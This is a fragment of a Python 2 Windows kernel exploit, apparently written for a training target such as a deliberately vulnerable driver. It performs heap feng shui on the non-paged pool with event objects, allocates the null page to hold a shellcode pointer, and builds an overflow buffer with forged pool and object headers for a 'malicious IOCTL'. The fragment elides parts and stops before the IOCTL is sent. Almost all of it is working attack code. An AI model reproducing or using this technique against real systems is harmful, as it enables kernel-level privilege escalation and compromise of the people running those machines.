...
def heapfengshei():
    global CreateEvent_array1
    global CreateEvent_array2

    print "[*]Starting Heap Feng Shui[*]"
    print "\t[+]Spraying non-paged pool"
    for a in range(10000):
        CreateEvent_array1.append(CreateEventA(None, False, False, None))
    print "\t[+]Spraying consecutive objects"
    for b in range(5000):
        CreateEvent_array2.append(CreateEventA(None, False, False, None))
    print "\t[+]Making holes in consecutive objects"
    for c in range(0, 5000, 16):
        for d in range(8):
            CloseHandle(CreateEvent_array2[c + d])

def freeremaining():
    global CreateEvent_array1
    global CreateEvent_array2

    print "[*]Freeing remaining objects"
    for a in range(10000):
        CloseHandle(CreateEvent_array1[a])
    for c in range(8, 5000, 16):
        for d in range(8):
            CloseHandle(CreateEvent_array2[c + d])

### Allocate Null Page ###
def nullalloc(shelladdr):
    print "[*]Allocating null page[*]"
    ProcessHandle = GetCurrentProcess()
    BaseAddress = c_void_p(0x1)
    ZeroBits = 0
    RegionSize = c_int(0x78)
    ...
    copypointer = create_string_buffer("\x00" * 0x70 + struct.pack("<L", shelladdr))
    memmove(0x4, addressof(copypointer), 0x74)
    print "\t[+]Copied shellcode pointer to null page"

### Create buffer and send IOCTL ###
def trigger(hDevice, dwIoControlCode):
    print "[*]Sending malicious IOCTL..."
    poolsize = 0x1f8
    poolheader = "\x40\x00\x08\x04\x45\x76\x65\xEE\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
    objectheader = "\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x00"
    Buffer = create_string_buffer("\x41" * poolsize + poolheader + objectheader)
    lpInBuffer = addressof(Buffer)
